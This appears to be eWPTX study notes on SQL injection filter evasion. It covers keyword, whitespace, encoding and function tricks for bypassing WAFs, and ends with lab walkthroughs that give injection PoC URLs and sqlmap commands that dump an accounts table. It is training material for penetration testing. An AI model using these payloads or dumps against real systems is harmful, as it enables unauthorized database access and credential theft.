---
title: "8 - SQLI Filter Evasion"
classes: single
header:  
  teaser: /assets/images/posts/ewptx/ewptx-teaser9.jpg
  overlay_image: /assets/images/main/header5.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Bypassing Keyword and Function Filters"
description: "Bypassing Keyword and Function Filters"
categories:
  - notes
  - ewptx
tags:
  - advanced
  - pentest
  - web  
  - bypass
toc: true
---

# SQL Injection Filter Evasion
  
  How WAFs try to protect websites

  WAF bypasses



## Introduction
SQLi has evolved so much, now we can not only manipulate database and gain access but also DoS, spread malware, phishing, etc 


### DBMS Gadgets

#### Comments
Comments are useful to devs For clarifying particular SQL statements

Our pourposes: Commenting out the query and obfuscating portions of our code

MySQL syntax:
```bash
https://dev.mysql.com/doc/refman/8.0/en/comments.html

#
* ... */
-- -
;%00
```

MSSQL syntax:
```bash
- http://msdn.microsoft.com/en-us/library/ff848807.aspx
/* ... */
-- -
;%00
```

Oracle syntax:
```bash
- https://docs.oracle.com/cd/B19306_01/server.102/b14200/sql_elements006.htm#i31713

/* ... */
-- -
```

## Functions and Operators
### MySQL
- http://dev.mysql.com/doc/refman/5.7/en/functions.html

Magic numbers: 
```bash
SELECT name from exployees WHERE id='MAGIC-HERE'

# By manipulating the plus and minus chars we can generate a countless list of the number 1:

id=1
id=--1
id=-+-+1
id=----2---1
```

Bitwise Functions:
```bash
- http://dev.mysql.com/doc/refman/4.1/en/bit-functions.html#operator_bitwise-invert
id=1&1
id=0|1
id=13^12
id=8>>3
id=~-2
```

Logical operator:
```bash
- http://dev.mysql.com/doc/refman/5.7/en/logical-operators.html
id=NOT 0
id=!0
id=!1+1
id=1&&1
id=1 AND 1
id=!0 AND !1+1
id=1 || NULL
id=1 || !NULL
id=1 XOR 1
```

Reguler Expression Operators (REGEX):
```bash
- http://dev.mysql.com/doc/refman/5.7/en/regexp.html
id={anything} REGEXP '.*'
id={anything} NOT REGEXP '{randomkeys}'
id={anything} RLIKE '.*'
id={anything} NOT RLIKE '{randomkeys}'
```

Comparison Operators:
```bash
- http://dev.mysql.com/doc/refman/5.7/en/comparison-operators.html

id=GREATEST(0,1)
id=COALESCE(NULL,1)
id=ISNULL(1/0)
id=LEAST(2,1)
```

In MSSQL we cannot use two equal signs concatenated:
```bash
id=1
id=-+-+1
id=-+-+-+-+-+-+1
id=-+-+-+-+-+-+-+-+-+1*-+-+-+-+-+-+-+-+-+1
```

BitWise Operators:
```bash
- http://msdn.microsoft.com/en-us/library/ms176122.aspx

We can only manipulate using:
&=(AND)
|=(OR) 
^ = (XOR)
```
In MySQL there are other operator that we can leveraged For testing the whether or not some conditions are true

→ http://dev.mysql.com/doc/refman/5.7/en/subqueries.html

In SQL Server, these are all grouped in one table:
```bash
- http://msdn.microsoft.com/en-us/library/ms189773.aspx
However there are not short forms, so 
&&
||
etc... Are not valid in this DBMS
```

### Oracle
```bash
SELECT name from exployees WHERE id='MAGIC-HERE'
```

Oracle is more restrictive

To use arithmetic operators, we must create valid expression to avoid the **missing expression erro**:
```bash
id=1
id=-(-1)
id=-(1)*-(1)
```

To combine values, functions and operators into expressions, we must follow the list of Conditions mixed to Expression

→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/conditions.htm#SQLRF005

→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/expressions.htm#SQLRF004

```bash
SELECT name from employees where id=some(1)
```

## Intermediary Characters
- Blank spaces are useful in separating functions, operators, declarations, and so forth, basically intermediary characters.
- However, there is non-common characters that can be user

### MySQL
```bash
SELECT[CHAR]name[CHAR]from[CHAR]employees
```

Universal characters allowed as whitespaces:

| Codepoint | Character ||
| 9         | U+0009    | = character tabulation|
| 10        | U+000A    | = Life feed (LF)|
| 11        | U+000B    | = Line  Tabulation|
| 12        | U+000C    | = Form feed|
| 13        | U+000D    | = Carriage return (CR)|
| 32        | U+0020    | = Space|

### MSSQL
The list of Universal characters allowed as a whitespace are large. Essentially, all the ASCII Control Characters, the space and the no-break space are allowed.

| Codepoint   | Character ||
| 160         | U+00A0    | = No-break space |

### Oracle
There are 7 characters in total

All the mysql table + the NULL char:

| Codepoint | Character ||
| 0         | U+0000    | // NULL|

## Non Universal characters 

### Mysql / MSSQL / Oracle
Plus Sign (+)

In all the DBMS we can use the (+) to separate almost all the keywords except **FROM**:
```bash
SELECT+name FROM exployees WHERE+id=1 AND+name LIKE+'J%'
```

In all DMBS depending on the context ,we can also use 
```bash
Parenthesis ()
Operators
Quotes 
and of course the C-Style comments /**/
```

## Constants and Variables
- Constants (AKA Reserved Words)
- Knowing the SQL keywords is a must
- System Variables also can be very useful

### MySQL
The only way to obfuscate keywords is by manipulating upper/lower case variations like:
```bash
sELeCt
SELect
etc
```

System Variables

→ http://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html

We can use the statement:
```bash
SHOW VARIABLES
```

The list is large, if u want to retrieve a specific value, just add @@ before the variable name:
```bash
@@version
```

User Variables:
```bash
SET @myvar={expression}
SET @myvar:={expression}
```

### MSSQL
Keywords

→ http://msdn.microsoft.com/en-us/library/ms189822.aspx

This list displays not only SQL reserved words, but also system functions

- Info about configuration and more is organized as Built-in Functions

→ http://technet.microsoft.com/en-us/library/ms174318(v=sql.110).aspx

There are primarily four types of functions, closer to variable are **Scalar Functions**:
```bash
@@version // its a Scalar function
```


### Oracle
Particular management of Words

→ https://docs.oracle.com/cd/B10501_01/appdev.920/a42525/apb.htm

There are both Reserved Words, the words that cannot be redefined, and Keywords, words always important but can be redefined by the user

Example: we can create a table **DATABASE** cause the keyword is not Reserved:
```bash
CREATE TABLE DATABASE (id number);
```

## Strings
Lets see techniques that are helpful in the creation, manipulation and obfuscation of strings

### Regular Notations

#### MYSQL
To define a string we can use:
```bash
single quote  ('')
double quotes ("")
```

To define string literals:
```bash
_latin1'string'
```

The character set that can be used has approximately 40 possible values and can use any of them preceded by an underscore character:
```bash
SELECT _ascii'Break Me'
```

U can use N'literal' or n'niteral' to create a string in the National character Set: http://dev.mysql.com/doc/refman/5.7/en/charset-national.html
```bash
SELECT N'mystring'
```

Hexadecimal

→ https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html

```bash
SELECT X'4F485045'
SELECT 0x4F485045
```

Bit Literals

→ https://dev.mysql.com/doc/refman/5.7/en/bit-value-literals.html

Using like B'literal' or b'literal':
```bash
SELECT 'a'=B'1100001' #TRUE
```

#### MSSQL
It defines the literal as either constant or scalar value.

- can be defined only by using single quotes (**' '**)

If the QUOTED_IDENTIFIER options is enabled, then we can use double quotes (**" "**)
```bash
SELECT 'Hello'
```

#### OrACLE
Also does not allow double quotes. But we can use National notation
→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/sql_elements003.htm#SQLRF00218

```bash
SELECT 'Hello'
SELECT N'Hello'
SELECT q'[Hello]'
SELECT Q'{Hello}'
SELECT nQ'("admin")'
```

### Unicode
MYSQL:
```bash
- http://dev.mysql.com/doc/refman/5.5/en/charset-collation-effect.html

Documented above:
SELECT 'admin'='âđɱȋň' #TRUE
```

### Escaping
Using backslash before both single and double quotes

→ https://dev.mysql.com/doc/refman/8.0/en/string-literals.html

However there are also other special characters used to escapse:
```bash
SELECT 'He\'llo'
SELECT 'He\%\_llo'
```

Furthermore, to escape quotes we can use the same character two times:
```bash
SELECT 'He''llo'
SELECT "He""llo"
```

If we try to escape a character that does not have a respective escaping sequence, the backslash will be ignored:
```bash
SELECT '\H\e\l\l\o'
SELECT 'He\ll\o'
```

In MSSQL and Oracle, u can escape single quotes by using two single quotes:
```bash
SELECT 'He''llo'
```

### Concatenation
For quoted strings, concatenation can be performed by placing the string next to each other:
```bash
SELECT 'he' 'll' 'o'
```

As an alternative, we can use functions like CONCAT and CONCAT_WS

→ http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_concat

→ http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_concat-ws

WS stand For **with separator**:
```bash
SELECT CONCAT('He','ll','o')
SELECT CONCAT_WS(''. 'He', 'll', 'o')
```

Its possible to concatenate using mix of comments in C-Style:
```bash
SELECT 'He'/**/'ll'/**/'o'
SELECT /**/'He'/**/'ll'/**/'o'/**/
SELECT /*!10000 'He' */'ll'/*****/'o'/*****/
```

in MSSQL:
Can be done by using both the operator (+) and the function CONCAT
→ http://msdn.microsoft.com/en-us/library/hh231515.aspx

```bash
SELECT 'He'+'ll'+'o'
SELECT CONCAT('He','ll','o')
```

We can obfuscate by using C-Style comments:
```bash
SELECT 'He'/**/+/**/'ll'/**/+'o'
SELECT CONCAT(/**/'He',/**/1/**/,/**/'lo'/**/)
```

In Oracle:
The operator is **||** and, from the function perspective, we can use **CONCAT** and **NVL**:

→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/functions026.htm#SQLRF00619

→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/functions110.htm#SQLRF00684

```bash
SELECT 'He'||'ll'||'o'
SELECT CONCAT('He','llo')
SELECT NVL('Hello', 'Goodbye')
```

Obfuscating the string concatenation:
```bash
SELECT q'[]'||'He'||'ll'/**/'o'
SELECT CONCAT(/**/'He'/**/,/**/'ll'/**/)
```

Integers:
- Example is to use the value PI (3,141593...). With FLOOR to obtain the value 3, and CEIL to obtain the value 4
- We can use system function like version() and obtain the value 5,6

For example
```bash
ceil(pi()*3) = 10
```

### MySQL Type Conversion
Combining arithmetic operations with different types:
```bash
SELECT ~'-2it\'s a kind of magic'
```

Numbers vs Booleans:
```bash
SELECT ... 1=TRUE
SELECT ... 2! =TRUE
SELECT ... OR 1
SELECT ... AND 1
```

Strings vs Numbers vs Booleans:
```bash
SELECT ... VERSION()=5.5 #5.5.30
SELECT ... @@VERSION()=5.5 #5.5.30
SELECT ... ('type'+'cast')=0 #TRUE
SELECT ~'-2it\'s a kind of mafic'        '#1
SELECT ~'-1337a kind of magic'-25 #1337
```

Bypassing Authentication:
```bash
# Put all of this together and try to think of some alternatives to the classic

x' OR 1='1
```





## Bypassing Keyword Filters
The first limitation are restriction on keywords

### Case Changing
The simplest is just change the cases of each character:
```bash
SeLeCt
SEleCT
etc
```

sqlmap has a tampering script to automate this case changing

→ https://github.com/sqlmapproject/sqlmap/blob/master/tamper/randomcase.py


### Using Intermediary Characters
We can use both comments instead of spaces and depending on the DBMS version,  a list of the whitespace that are not matched as spaces:
```bash
SELECT/**/values/**/and/**/.../**/or/**/
SELECT[sp]values[sp]and...[sp]or[sp]
```

### Using alternative Techniques
```bash
SELECT"values"from'table'where/**/1
SELECT(values)from(table)where(1)
SELECT"values"''from'table'where(1)
SELECT+"values"%A0from'table'
```

### Circumventing by Encoding
It all depends on how the application processes data

- between the attacker and the application, there are many layers, such as a proxy, firewall, etc. If some of these layers handle the encoding differently, there could be a possible bypass

URL Encoding:
```bash
- Usually when the requests are sent through the internet via HTTP, they are URL encoded.
- In this case we can send the entire string URL-encoded
```

Double URL Encoding:
```bash
# If u encode a URL-Encoded string, they u are performing a Double URL-Encoding

s = %73 > %2573
```

> IN this case, if the filter decodes the request the first time and applies the rules, it will not find anything dangerous

> Then when the application receives the request, it will decode the contents and trigger the malicious request

### Replaced Keywords
```bash
Booleans > AND, OR
- AND = &&
- OR  = ||
# only in MySQL and MSSQL
WHERE ID=x && 1=1
WHERE ID=x || 1=1

# If && and || are filtered, then u must use 'UNION'
```
```bash
UNION > Simple case
# We can use many variants to elude these kind of filters:

UNION(SELECT 'VALUES'...) &&
UNION ALL SELECT ...
UNION DISTINCT SELECT ...
/*!00000 UNION*//*!00000 SELECT*/ ...
```

WHen the **UNION** is filtered, we must switch to blind SQLi exploitation:
```bash
(SELECT id FROM users LIMIT 1)='5 ...
```

In Oracle: 

→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/queries004.htm#SQLRF52323

- We can use **INTERSECT** or **MINUS** operators


WHERE, GROUP, LIMIT, HAVING:

- Useful keywords to select a specific entry

If the filter blocks **WHERE** keyword, we can alternatively use **GROUP BY** + **HAVING**:
```bash
SELECT id FROM users GROUP BY id HAVING id='5 ...
```


If **GROUP BY** is filtered, we must revert to blind SQLi:
```bash
AND length((select first char)='a') //0/1 > true/false
```


If **HAVING** is filterd, in this case we must leverage functions like **GROUP_CONCAT**, functions that manipulates strings, etc. Of course, all of this is blind!


If **SELECT** is filtered, The exploitation can vary and really depends upon the injection point.

You need to use functions that manipulate FILES such as:
```bash
load_files //in mysql
```

Another option, brute-force or guess the column names by appending other **WHERE** condition such as:
```bash
AND COLUMN IS NOT NULL ...
```

Alternatively, being able to invoke the **stored procedure analyse()**

→ http://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html

This **sproc** returns juicy information about the query just executed:
```bash
SELECT * FROM employees procedure analyse()
```


## Bypassing Function Filters

Lets now unpack useful techniques and alternative functions For use in these types of scenarios

### Building Strings
In the DBMS Gadget chapter, we discussed how to generate strings but, we used quotes. Building strings without quotes is a little bit tricky:
```bash
- UNHEX
- HEX
- CHAR
- ASCII
- ORD
```

UNHEX is useful in translating hexadecimal numbers to string:
```bash
- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_unhex

SUBSTR(USERNAME,1,1)=UNHEX(48)
SUBSTR(USERNAME,1,2)=UNHEX(4845)
...
SUBSTR(USERNAME,1,5)=UNHEX('48454C4C4F')
SUBSTR(USERNAME,1,2)=0x48454C4C4F
```

HEX function is useful to convert o hexadecimal:
```bash
- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_hex

HEX(SUBSTR(USERNAME,1,1))=48
HEX(SUBSTR(USERNAME,1,2))=4845
...
HEX(SUBSTR(USERNAME,1,5))='48454C4C4F'
```

CHAR can also be used:
```bash
- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_char

SUBSTR(USERNAME,1,1)=CHAR(72)
SUBSTR(USERNAME,1,2)=CHAR(72,69)
...
SUBSTR(USERNAME,1,1)=CONCAT(CHAR(72),CHAR(69))
```

ASCII and ORD: twin functions:
```bash
- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_ascii
- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_ord

ASCII(SUBSTR(USERNAME,1,1))=48
ORD(SUBSTR(USERNAME,1,1))=48
```

CONV:
mySQL offers an interesting method in returning the string representation of a number from two bases

- http://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_conv

> The highest base we can use is 36

We cannot use For **unicode** characters; however, at least we can generate a string from a-zA-Z0-9:
```bash
CONV(10,10,36) //'a'
CONV(11,10,36) //'b'
```

We can mix the results with **upper** and **lower** functions to retrieve the respective representation:
```bash
LOWER(CONV(10,10,36)) #'a'
LCASE(CONV(10,10,36)) #'a'
UPPER(CONV(10,10,36)) #'A'
UCASE(CONV(10,10,36)) #'A'
...
```

### Brute-force Strings
```bash
- LOCATE
- INSTR
- POSITION
```
If u cannot build a string, u can try to locate either a segment or an entire string using functions that return the position of the first occurrence of substrings, and then use conditional statements For the Boolean condition.
```bash
IF(LOCATE('H',SUBSTR(USERNAME,1,1)),1,0)
# u can also use functions 'INSTR' and 'POSITION'
```



### Building Substring
```bash
- SUBSTR
- MID
- SUBSTRING
```

MID is a synonym of SUBSTRING, which is a synonym of SUBSTR:
```bash
[SUBSTR|MID|SUBSTRING]('HELLO' FROM 1 FOR 1)
```

Alternatively, functions **LEFT** and **RIGHT**

→ http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_left

→ http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_right

```bash
[LEFT|RIGHT]('HELLO',2) //HE or LO
```

More options functions like **RPAD** and **LPAD**:
```bash
[LPAD,RPAD]('HELLO',6,'?') //?HELLO or HELLO?
[LPAD,RPAD]('HELLO',1,'?') //H
...
[LPAD,RPAD]('HELLO',5,'?') //HELLO 
```


## Labs
Note: Different sqlmap versions may require different options/flags. For example lab 4 may be solved using the below:
```bash
sqlmap -u 'http://192.222.62.2/upload.php?lab=4&payload=' -p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 --banner --flush-session --regexp='99\sviews'  --prefix="01.jpg'"
```



### 1 - ENTRY LEVEL
```bash
# Query:
$query = "SELECT views from attachments where filename='$filename'";


# PoC
http://hacker.site/2nd/view.php?payload=%27%20union%20select%20@@version;%20--%20-

# SQLMAP
./sqlmap.py -u 'http://hacker.site/2nd/view.php?payload=a' --technique=U --suffix='; -- -' --banner
	
./sqlmap.py -u 'http://hacker.site/2nd/view.php?payload=a' --technique=U --suffix='; -- -' -D selfie4you01 -T accounts --dump --no-cast
```


### 2 - UNION SELECT
- no filters

```bash
Filters: none

Query:
$query = "SELECT views FROM attachments where filename='$entry';";


# PoC
http://hacker.site/2nd/upload.php?lab=2&payload='+union+select+@@version;%23

# SQLMAP
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=2&payload=_" -p payload --technique=U --suffix=';#' --union-col=1 --dbms MySQL --banner --no-cast

./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=2&payload=_" -p payload --technique=U --suffix=';#' --union-col=1 --dbms MySQL -D selfie4you02 -T accounts --dump --no-cast

```



### 3 - UNION SELECT 
- randomcase filter
- union-char it's not required here

```bash
Filters:
/UNION/
/SELECT/

Query:
$query = "SELECT views FROM attachments where filename='$entry';";


# PoC
http://hacker.site/2nd/upload.php?lab=3&payload=a%27%20UNIoN%20SeLECT%20%27PoC%20String%27;%20--%20-

# SQLMAP

./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=3&payload=b' \
	-p payload --technique=U --suffix=';#' --dbms MySQL --union-col=1 --no-cast \
	--tamper=randomcase --banner

./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=3&payload=b' \
	-p payload --technique=U --suffix=';#' --dbms MySQL --union-col=1 --no-cast \
	--tamper=randomcase -D selfie4you03 -T accounts --dump
```



### 4 - Boolean-based blind
- UNION filtered out
- symboliclogical filter (AND > && , OR > ||)

```bash
Filters:
/UNION/i
/\ AND\ /i

Query:
$query = "SELECT views FROM attachments where filename='$entry';";


# POCs

# (%26) == &
TRUE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg'+%26%26+'123'='123
FALSE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg'+%26%26+'123'='1

# using true (1) and false (0)booleans
# (%23) == #
TRUE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg'+%26%26+TRUE;%23
FALSE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg'+%26%26+FALSE;%23


# SQLMAP
./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=4&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	--banner --flush-session

./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=4&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	-D selfie4you04 -T accounts --dump

```



### 5 - Boolean-based blind
* UNION filtered out
* symboliclogical filter (AND > && , OR > ||)

```bash
Filters:
/UNION/i
/\ AND\ /i
/\ OR\ /i

Query;
$query = "SELECT views FROM attachments where filename='$entry';";


POCs:
# same as #4 but with filter that applies to OR too 
# (%7C) == |

# SQLMAP
./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=5&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	--banner --flush-session

./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=5&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	-D selfie4you05 -T accounts --dump 

```




### 6 - Boolean-based blind
* UNION filtered out
* symboliclogical filter (AND > && , OR > ||)
* space to verical tab filter to bypass [space]OR filter

```bash
Filters:
/UNION/i
/AND/i
/ OR/i

Query;
$query = "SELECT views FROM attachments where filename='$entry';";

# SQLMAP

./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=6&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' --tamper="symboliclogical, space2VT.py" \
	--no-cast --threads=10 -v 3 \
	--banner --flush-session 
	
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=6&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' \
	--tamper="symboliclogical, space2VT.py" \
	--no-cast --threads=5 -v 3 \
	-D selfie4you06 -T accounts \	
	--columns 
```



### 7 - Boolean-based blind
* UNION filtered out
* symboliclogical filter (AND > && , OR > ||)
* space to verical tab filter to bypass [space]OR filter

```bash
Filters:
/UNION/i
/AND/i
/ OR/i
/6163636f756e7473/
/selfie4you07.accounts/

Query;
$query = "SELECT views FROM attachments where filename='$entry';";


# PoC
TRUE:	http://hacker.site/2nd/upload.php?lab=7&payload=01.jpg'+%26%26+TRUE;%23


# SQLMAP

./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=7&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' \
	--tamper="symboliclogical, space2VT.py, accounts.py" \
	--no-cast --threads=5 -v 3 \
	--banner --flush-session 
	
	
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=7&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' \
	--tamper="symboliclogical, space2VT.py, accounts.py" \
	--no-cast --threads=5 -v 3 \
	-D selfie4you07 -T accounts \
	--columns
	
```

### BONUS LEVEL(s)

IN ALL LEVELS THE FILTER IS NOT RECOURSIVE

- To exploit it you should upload first a filename with the payload you want to execute.
- This will be excluded because contains filtered words
- Then upload a new file with a name that bypass the redundant filter, such as *unUNIONnion*. 
- Once **purified** the latest filename will be the same as the fist uploaded and thus the file exitsts and can be displayed.

